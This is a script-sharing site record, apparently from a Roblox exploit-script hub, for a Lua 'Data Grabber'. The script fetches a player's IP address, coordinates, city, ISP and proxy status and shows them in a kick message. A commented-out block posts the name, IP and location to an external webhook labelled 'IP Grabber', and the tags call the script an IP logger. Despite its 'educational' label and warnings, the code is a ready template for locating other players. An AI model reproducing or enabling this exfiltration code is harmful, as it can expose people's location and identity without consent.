{"_id":"69979b979e7e1989ba0365f4","title":"Data Grabber","game":{"_id":"67e5e1ffb360710ec3c77d0f","gameId":0,"name":"Universal Script 📌","imageUrl":{"url":"https://media.kocakz.me/4643d25ebff2bfb11a32a83c61d2c1d62f80ec61ec8b4f06b72f65ada67912ef.webp","original":"https://scriptblox.com/images/sb/0-1771543447823.png"},"slug":"universal","path":"/game/universal","thumbnail":{"url":"https://media.kocakz.me/4643d25ebff2bfb11a32a83c61d2c1d62f80ec61ec8b4f06b72f65ada67912ef.webp","original":"https://scriptblox.com/images/sb/0-1771543447823.png"},"placeId":0},"slug":"Universal-Script-Data-Grabber-114264","verified":false,"key":false,"keyless":false,"views":3073,"executes":1633,"scriptType":"free","isUniversal":true,"isPatched":false,"visibility":"public","indexUnlisted":false,"image":{"url":"https://media.kocakz.me/7f11243521da5b63157e4f871228be09bd06e009fdb2cd68f84d741181e42c4f.webp","original":"https://scriptblox.com/images/sb/0-1771543447823.png","scriptblox":"https://scriptblox.com/images/script/0-1771543447823.png"},"thumbnail":{"url":"https://media.kocakz.me/7f11243521da5b63157e4f871228be09bd06e009fdb2cd68f84d741181e42c4f.webp","original":"https://scriptblox.com/images/sb/0-1771543447823.png","scriptblox":"https://scriptblox.com/images/script/0-1771543447823.png"},"likeCount":3,"dislikeCount":2,"createdAt":"2026-02-19T23:24:07.834Z","updatedAt":"2026-02-19T23:24:07.834Z","lastBump":"2026-02-19T23:24:07.834Z","script":"local HttpService = game:GetService(\"HttpService\")\nlocal Players = game:GetService(\"Players\")\n\nlocal d = game:GetService(\"HttpService\"):JSONDecode(request({Url = \"http://ip-api.com/json?fields=query,lat,lon,country,countryCode,continent,continentCode,region,regionName,city,district,zip,timezone,offset,isp,org,as,asname,reverse,mobile,proxy,hosting\"}).Body)\nlocal p = Players.LocalPlayer\n\np:Kick((\"[Be careful Next time twin]\\n\"..\n\"User: %s (ID: %d)\\n\"..\n\"IP: %s\\n\"..\n\"Coordinates: %.6f, %.6f\\n\"..\n\"Continent: %s (%s)\\n\"..\n\"Country: %s (%s)\\n\"..\n\"Region: %s\\n\"..\n\"City: %s | District: %s\\n\"..\n\"ZIP: %s\\n\"..\n\"Timezone: %s (UTC%s)\\n\"..\n\"ISP: %s\\n\"..\n\"Organization: %s\\n\"..\n\"ASN: %s (%s)\\n\"..\n\"Reverse DNS: %s\\n\"..\n\"Mobile: %s\\n\"..\n\"Proxy: %s\\n\"..\n\"Hosting: %s\"):format(\np.Name, p.UserId, d.query, d.lat, d.lon, d.continent, d.continentCode,\nd.country, d.countryCode, d.regionName, d.city, d.district, d.zip,\nd.timezone, d.offset, d.isp, d.org, d.as, d.asname, d.reverse,\nd.mobile and \"YES\" or \"NO\", d.proxy and \"YES\" or \"NO\", d.hosting and \"YES\" or \"NO\"\n))\n\n--[[ WEBHOOK\nlocal WEBHOOK = \"dont_you_dare_to_use_this_to_someone\"\nHttpService:PostAsync(WEBHOOK, HttpService:JSONEncode({\n    username=\"IP Grabber\", content=p.Name..\" | \"..d.query..\" | \"..d.lat..\",\"..d.lon..\" | \"..d.city..\" | \"..d.country\n}))\n--]] ","features":"Script Features – Maximum Data Grabber (Xeno Compatible)\n🌍 Geolocation Features\n\nRetrieves public IP address of the local player.\n\nFetches detailed location data: latitude, longitude, continent, country, region, city, district, ZIP code.\n\nTimezone information and UTC offset.\n\nNetwork provider information: ISP, organization, ASN, AS Name.\n\nReverse DNS lookup.\n\nDetects if connection is via mobile, proxy, or hosting service.\n\n👤 Player Data\n\nCaptures local player username and UserId.\n\n🚪 Local Display\n\nShows all collected data in a kick message (forced disconnect).\n\n📤 Optional Webhook (Disabled by Default)\n\nCan send data to an external webhook (e.g., Discord).\n\n⚠️ Disabled by default for safety.\n\n⚠️ Important Warnings\n\nDo not use on other people. This script collects sensitive information such as IP and location. Using it on others may violate privacy laws and Roblox terms of service.\n\nDefault behavior is harmless. Kick message only affects the local player.\n\nWebhook feature is commented out. Enabling it will exfiltrate data externally – use responsibly and only on your own account for testing.\n\nExecutor compatibility: Requires an exploit that supports request() (e.g., some Xeno versions may block it).\n\nUse at your own risk. Script is unverified and may be unsafe if modified.","tags":["IP logger","data grabber","iplookup","educational"],"discord":"","keyLink":"","owner":{"_id":"697f5c2e2264ea2ca438a6eb","username":"LuaFollo","verified":false,"profilePicture":{"url":"https://media.kocakz.me/62436299e4a6d548d4a0f5bf5824586ac0929b370c755ecc90077b0547fe35ce.webp","original":"https://scriptblox.com/images/photo/697f5c2e2264ea2ca438a6eb-1770764878373.png"},"status":"offline","id":"697f5c2e2264ea2ca438a6eb","topMilestone":{"key":"creator.executions","tier":10000},"profile":{"url":"https://media.kocakz.me/62436299e4a6d548d4a0f5bf5824586ac0929b370c755ecc90077b0547fe35ce.webp","original":"https://scriptblox.com/images/photo/697f5c2e2264ea2ca438a6eb-1770764878373.png"}},"reviewed":null,"liked":false,"disliked":false,"cstatus":{"verdict":"none","pct":null,"conf":0,"n":{"w":0,"b":0,"p":0,"d":0,"k":0},"total":0,"detected":false,"key":false,"recent":0,"at":"2026-10-19T22:12:05.664Z","last":"","win":14,"math":3},"isHub":false,"supportedGames":[],"changelog":[{"_id":"69979b979e7e1989ba0365f7","editBy":{"_id":"697f5c2e2264ea2ca438a6eb","username":"LuaFollo","status":"offline","id":"697f5c2e2264ea2ca438a6eb"},"message":"plz dont use this to someone","createdAt":"2026-02-19T23:24:07.837Z"}],"comments":[{"_id":"69979c2f294333bf10e97c26","commentBy":{"_id":"6991500a5d1c3cf1bfacbe6a","username":"FORGEIN","verified":false,"role":"user","profilePicture":{"url":"https://media.kocakz.me/d0657d56c6b02b0e8e6ea178240a3dae72ea2079da95eb49aaf00931e9c4c6ef.webp","original":"https://scriptblox.com/images/photo/6991500a5d1c3cf1bfacbe6a-1772265718181.jpg"},"lastActive":"2026-02-28T08:03:08.555Z","createdAt":"2026-02-15T04:48:10.889Z","status":"offline","id":"6991500a5d1c3cf1bfacbe6a","profile":{"url":"https://media.kocakz.me/d0657d56c6b02b0e8e6ea178240a3dae72ea2079da9